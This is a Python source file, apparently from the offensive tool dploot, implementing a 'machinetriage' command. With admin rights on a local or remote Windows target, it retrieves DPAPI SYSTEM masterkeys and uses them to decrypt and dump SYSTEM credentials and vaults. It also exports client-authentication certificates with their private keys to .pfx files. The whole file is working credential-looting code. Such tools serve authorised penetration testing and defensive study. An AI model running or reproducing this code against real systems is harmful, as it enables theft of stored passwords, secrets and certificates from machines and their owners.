import argparse
import logging
from typing import Callable, Tuple

from dploot.action import DPLootAction
from dploot.lib.utils import dump_looted_files_to_disk
from dploot.triage.certificates import CertificatesTriage
from dploot.triage.credentials import CredentialsTriage
from dploot.triage.masterkeys import MasterkeysTriage
from dploot.triage.vaults import VaultsTriage

NAME = "machinetriage"


class MachineTriageAction(DPLootAction):
    def __init__(self, options: argparse.Namespace) -> None:
        super().init_triage_generic(options)

    def run(self) -> None:
        super().run()
        if self.conn.is_admin():
            if self.masterkeys is None:

                def masterkey_callback(masterkey):
                    masterkey.dump()

                masterkeys_triage = MasterkeysTriage(
                    target=self.target,
                    conn=self.conn,
                    per_masterkey_callback=masterkey_callback,
                )
                logging.info("Triage SYSTEM masterkeys\n")
                self.masterkeys = masterkeys_triage.triage_system_masterkeys()
                print()
                if self.outputdir is not None:
                    dump_looted_files_to_disk(self.outputdir, masterkeys_triage.looted_files)

            def credential_callback(credential):
                if self.options.quiet:
                    credential.dump_quiet()
                else:
                    credential.dump()

            credentials_triage = CredentialsTriage(
                target=self.target,
                conn=self.conn,
                masterkeys=self.masterkeys,
                per_credential_callback=credential_callback,
            )
            logging.info("Triage SYSTEM Credentials\n")
            credentials_triage.triage_system_credentials()
            if self.outputdir is not None:
                dump_looted_files_to_disk(self.outputdir, credentials_triage.looted_files)

            vaults_triage = VaultsTriage(
                target=self.target,
                conn=self.conn,
                masterkeys=self.masterkeys,
                per_vault_callback=credential_callback,
            )
            logging.info("Triage SYSTEM Vaults\n")
            vaults_triage.triage_system_vaults()
            if self.outputdir is not None:
                dump_looted_files_to_disk(self.outputdir, vaults_triage.looted_files)

            def certificate_callback(certificate):
                if not self.options.dump_all and not certificate.clientauth:
                    return
                if not self.options.quiet:
                    certificate.dump()
                filename = f"{certificate.username}_{certificate.filename[:16]}.pfx"
                logging.critical("Writting certificate to %s" % filename)
                with open(filename, "wb") as f:
                    f.write(certificate.pfx)

            certificate_triage = CertificatesTriage(
                target=self.target,
                conn=self.conn,
                masterkeys=self.masterkeys,
                per_certificate_callback=certificate_callback,
            )
            logging.info("Triage SYSTEM Certificates\n")
            certificate_triage.triage_system_certificates()
            if self.outputdir is not None:
                dump_looted_files_to_disk(self.outputdir, certificate_triage.looted_files)
        else:
            logging.info("Not an admin, exiting...")

def entry(options: argparse.Namespace) -> None:
    a = MachineTriageAction(options)
    a.run()


def add_subparser(subparsers: argparse._SubParsersAction, protocol: str) -> Tuple[str, Callable]:
    subparser = subparsers.add_parser(
        NAME,
        help="Loot SYSTEM Masterkeys (if not set), SYSTEM credentials, SYSTEM certificates and SYSTEM vaults from local or remote target",
    )

    group = subparser.add_argument_group("machinetriage options")

    group.add_argument(
        "--mkfile",
        action="store",
        help=("File containing {GUID}:SHA1 masterkeys mappings"),
    )

    group.add_argument(
        "--dump-all",
        action="store_true",
        help=("Dump also certificates not used for client authentication"),
    )

    DPLootAction.add_general_args(subparser, protocol)

    return NAME, entry
